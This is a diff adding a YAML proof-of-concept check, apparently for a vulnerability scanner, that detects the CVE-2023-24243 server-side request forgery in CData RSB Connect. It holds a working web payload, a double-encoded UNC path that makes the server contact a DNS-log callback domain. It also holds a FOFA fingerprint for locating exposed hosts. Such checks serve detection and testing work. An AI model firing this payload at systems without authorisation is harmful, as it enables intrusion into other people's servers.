@@ -1,0 +1,24 @@
+id: poc-yaml-cdata-rsb-connect-ssrf
+info:
+  name: CData RSB Connect 服务端请求伪造漏洞(CVE-2023-24243)
+  severity: high
+  tags:
+  - DNSLOG
+  - ssrf
+  - CVE-2023-24243
+  finger: arc
+  fofa: icon_hash="163538942"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /%255c%255c{{.reverseDomain}}%255cC$%255cbb
+  expression: 'status_code == 404
+
+    && body == ""
+
+    && reverse.Verify()
+
+    '
+transport: http
